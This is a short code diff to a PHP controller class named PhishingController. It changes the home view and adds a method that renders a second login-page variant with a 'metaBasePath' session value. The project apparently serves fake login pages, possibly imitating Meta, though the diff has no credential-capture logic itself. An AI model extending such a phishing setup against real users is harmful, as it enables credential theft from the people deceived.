@@ -36,7 +36,7 @@ class PhishingController extends Controller
 
     public function index()
     {
-        return view('landing.home');
+        return view('index');
     }
 
     public function about()
@@ -121,6 +121,12 @@ class PhishingController extends Controller
         return view('fx', [
             'metaBasePath' => $session['metaBasePath']
         ]);
+    }
+
+    public function showLogin2v2()
+    {
+        $session = $this->getSessionData();
+        return view('login2v2', ['metaBasePath' => $session['metaBasePath']]);
     }
 
     public function getSessionPaths()
